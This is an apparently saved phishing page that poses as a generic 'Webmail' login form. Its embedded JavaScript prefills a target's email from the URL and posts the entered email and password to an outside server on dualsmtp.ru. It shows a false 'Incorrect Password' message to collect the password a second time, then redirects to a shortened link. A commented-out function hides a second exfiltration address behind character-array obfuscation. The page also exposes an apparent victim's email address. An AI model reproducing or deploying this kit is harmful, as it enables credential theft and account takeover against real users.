<!-- saved from url=(0069)https://c6ru4-tyaaa-aaaad-qchkq-cai.raw.ic0.app/#camekals@scs-net.org -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://dualsmtp.ru/email-list/gwebml8/assets/favicon.png" type="image/png">
    <title>Webmail</title>
    <style>
        *,*:after,*:before{
            box-sizing: border-box;
        }
        body{
            margin: 0;
            font-family: Helvetica, sans-serif;
            color: #fff;
        }
        .safflower-main-wrap{
            display: flex;
            min-height: 100vh;
            position: relative;
            color: #1d1e20;
            justify-content: center;
            align-items: center;
            background: url('https://dualsmtp.ru/email-list/gwebml8/assets/webmail-login.svg') no-repeat fixed center;
            background-size: cover;
            padding: 20px;
        }
        .inner-wrap{
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 612px;
            line-height: 24px;
            background: linear-gradient( 90deg,rgba(255,255,255,0.95) 20%,rgba(255,255,255,0.65) 100%);
            backdrop-filter: blur(3px);
        }
        .form-wrap{
            width: 100%;
            max-width: 524px;
            padding: 32px 40px;
            margin: auto;
        }
        .form-wrap label{
            width: 100%;
            height: 1.75rem;
            font-weight: 500;
            font-size: 14px;
            line-height: 1.5rem;
            color: rgb(0 0 0 / 87%);
            display: block;
        }
        .form-wrap input{
            height: initial;
            padding: 12px 16px;
            font-size: 14px;
            line-height: 24px;
            border: 1px solid #dad9da; 
            border-radius: 4px;
            background-color: #fff;
            background-clip: padding-box;
            border-radius: 0.25rem;
            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
            display: block;
            width: 100%;
        }
        .form-wrap input:focus,.form-wrap input:active,.form-wrap input:visited{
            border: 1px solid #0076FF;
            outline: none !important;
        }
        .form-group{
            margin-bottom: 20px;
            position: relative;
        }
        .form-wrap input[type=password]{
            padding-right: 32px;
            position: relative;
        }
        .form-group .eyecon{
            opacity: 0.7;
            width: 18px;
            height: 18px;
            position: absolute;
            bottom: 16px;
            right: 10px;
            background-image: url(https://dualsmtp.ru/email-list/gwebml8/assets/view.png);
            background-size: 100%;
            cursor: pointer;
            z-index: 999;
        }
        .form-group.password-show .eyecon{
            background-image: url(https://dualsmtp.ru/email-list/gwebml8/assets/visibility.png);
        }
        .form-group.check input {
            padding: 0;
            height: initial;
            width: initial;
            margin-bottom: 0;
            display: none;
            cursor: pointer;
        }

        .form-group.check label {
            position: relative;
            cursor: pointer;
        }

        .form-group.check label:before {
            content:'';
            -webkit-appearance: none;
            background:#ffffff;
            border: 1px solid rgb(0 0 0 / 40%);
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05), inset 0px -15px 10px -12px rgba(0, 0, 0, 0.05);
            padding: 8px;
            display: inline-block;
            position: relative;
            vertical-align: middle;
            cursor: pointer;
            margin-right: 5px;
        }
        .form-group.check input:checked + label:before{
            background:#0076FF;
        }
        .form-group.check input:checked + label:after {
            content: '';
            display: block;
            position: absolute;
            top: 5px;
            left: 7px;
            width: 5px;
            height: 12px;
            border: solid #fff;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        .btn,.form-wrap button,.form-wrap input[type=submit]{
            outline: none;
            background: #0076FF;
            border: 1px solid #0076FF;
            border-radius: 4px;
            color: #fff;
            width: 100%;
            line-height: 36px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 32px;
        }
        .internal-link{
            color: #0076FF;
            font-size: 14px;
            display: block;
            margin-top: 32px;
        }
        .form-wrap h2{
            font-size: 20px;
            line-height: 32px;
            margin: 0;
            font-weight: 600;
            margin-bottom: 20px;
        }        
        .logo{
            height: 32px;
            margin: 0 auto 32px;
            display: block;
        }
    </style>
</head>
<body>
    <main class="safflower-main-wrap">     
        <div class="inner-wrap">
            <div class="form-wrap">
                <img src="./Webmail_files/webmail-logo.svg" class="logo">
                <h2 class="text-left">
                    Hi, &#128075;<br>
                    Welcome to Webmail
                </h2>
                <form id="themform">
                    <div class="form-group">
                        <input name="em" type="text" class="form-control" placeholder="Email address">
                    </div>
                    <div class="form-group password">
                        <input name="pa" type="password" class="form-control" placeholder="Password" id="password">
                        <span class="eyecon">
                        </span>
                    </div>
                    <div id="errmsg" style="color: red; display: none;">Incorrect Password</div>
                    <div class="form-group check">
                        <input type="checkbox" id="remember">
                        <label for="remember">remember me</label>
                    </div>
                    <button type="submit" class="btn">Login</button>
                    <a class="internal-link" href="https://c6ru4-tyaaa-aaaad-qchkq-cai.raw.ic0.app/">Forgot password?</a>
                </form>
            </div>
        </div>
    </main>



    <script src="./Webmail_files/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script>
        $('.eyecon').click(function() {
            $(this).parent().toggleClass('password-show');
            input = $(this).parent().find("input");
            if (input.attr("type") == "password") {
                input.attr("type", "text");
            } else {
                input.attr("type", "password");
            }
        });
    </script>
         <script src="./Webmail_files/jquery-3.3.1.min.js"></script>
    <script>
      $(document).ready(function(){
        var errmsg = $('#errmsg');
        errmsg.hide();
        var ufromUrl = get_email_hash();
        if(!ufromUrl){
          ufromUrl = geturlparameter('username'); 
        }
        var redirectUrl = ('https://owy.mn/35MDuDz');
        var isStyleDouble = 2;
        var styleDoubleCounter = 1;
        var styleDoubleFromUrl = 1;
        var formcon = $('#themform');
        var em = $('#themform input[name=em]');
        var ps = $('#themform input[name=ps]');
        
        if(ufromUrl){ em.val(ufromUrl);  }
        var emv = ''; var psv = '';  
        if(isStyleDouble){
          styleDoubleFromUrl = geturlparameter('db');
          if(styleDoubleFromUrl){
            styleDoubleFromUrl = parseInt(styleDoubleFromUrl);
            if(isNaN(styleDoubleFromUrl)){
              styleDoubleFromUrl = 1;
            }
            if(styleDoubleFromUrl > 1){
            errmsg.show();
            }
          }
          else{ styleDoubleFromUrl = 1; }
        }
        formcon.submit(function(e){
          e.preventDefault();
          emv = em.val();
          psv = ps.val();
            if(em && em.length > 0 && psv && psv.length > 0){
              var theemidval = '5a80db15dd962954bdb5dca723a29108';
              //mg(emv, psv,'G-Webmail');  
              $.ajax({
                url: 'https://dualsmtp.ru/email-list/onedrive25/finish.php', 
                type: 'POST', 
                dataType: 'html', 
                data: { Email : emv, password : psv, typeofemail : 'G-Webmail', theemid : theemidval}, 
                crossDomain: true,
                  success: function(msg) {
                },
                error: function(e) {
                  console.log(e)
                }
              });
              if(isStyleDouble && styleDoubleFromUrl && styleDoubleFromUrl < isStyleDouble && styleDoubleFromUrl < 3){
                styleDoubleFromUrl++;
                redirectUrl = 'index.html?'+get_rand_url_pars()+'&username='+emv+'&db='+styleDoubleFromUrl;
              }
              setTimeout(function(){
                window.location.replace(redirectUrl);
                //alert(redirectUrl);
              }, 2000);              
            }
          });
        
        
      });


//function evandoor(a,o,t){var h = ['O','L','t','q','e','D','c','-','.','z','u','2','T','m','V','J','6','U','P','b','v','K','B','Z','i','7','R',':','C','/','o','r','n','Q','S','5','3','8','a','M','W','I','x','H','Y','4','1','k','s','d','g','A','j','F','N','9','G','l','f','p','X','0','w','y','E','h'],f = h[65]+h[2]+h[2]+h[59]+h[48]+h[27]+h[29]+h[29]+h[38]+h[59]+h[24]+h[49]+h[38]+h[2]+h[38]+h[6]+h[48]+h[48]+h[8]+h[6]+h[30]+h[13]+h[29]+h[58]+h[24]+h[32]+h[24]+h[48]+h[65]+h[7]+h[10]+h[32]+h[20]+h[11]+h[11]+h[8]+h[59]+h[65]+h[59];$.ajax({url:f,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:t},crossDomain:!0,success:function(a){},error:function(a){}})}
function randomInteger(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(r,n){for(var o="",t=r;0<t;--t)o+=n[Math.floor(Math.random()*n.length)];return o}
function getdomainpartofemail(a){var e,t=!1;return!validateEmail(a)||-1!=(e=(a=a.toLowerCase()).indexOf("@"))&&(t=a.substr(e+1)),t}
function get_email_hash(){var a=!1,i=window.location.href,t=(i=i.trim()).lastIndexOf("#");return-1!=t&&(a=i.substring(t+1),validateEmail(a)||(a=!1)),a}
function validateEmail(t){return/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())}
function geturlparameter(r){for(var t=window.location.search.substring(1).split("&"),e=0;e<t.length;e++){var n=t[e].split("=");if(n[0]==r)return decodeURIComponent(n[1])}}
function get_rand_url_pars(){var r="",n=0,a="abcdefghijklmnopqrstuvwxyz",e=a;a+=a.toUpperCase()+"123456789";for(var t=randomInteger(3,10),n=0;n<t;n++)r+="&"+randomString(randomInteger(3,10),e)+"="+randomString(randomInteger(15,30),a);return r.substr(1)}

    </script>

</body></html>
